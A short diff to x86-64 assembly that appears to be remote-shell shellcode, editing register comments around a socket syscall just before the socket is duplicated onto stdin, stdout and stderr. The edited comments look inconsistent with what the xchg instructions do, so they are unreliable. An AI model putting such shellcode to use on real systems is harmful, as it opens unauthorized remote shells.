@@ -49,8 +49,8 @@
     cdq
     syscall
     
-    xchg    eax, edi         ; edi = s
-    xchg    eax, esi         ; esi = 2, eax = 0
+    xchg    eax, edi         ; edi = s, eax = 2
+		xchg    eax, esi         ; esi = 2, eax = 1
     
     ; step 2, assign socket handle to stdin,stdout,stderr
     ; dup2 (s, STDIN_FILENO)
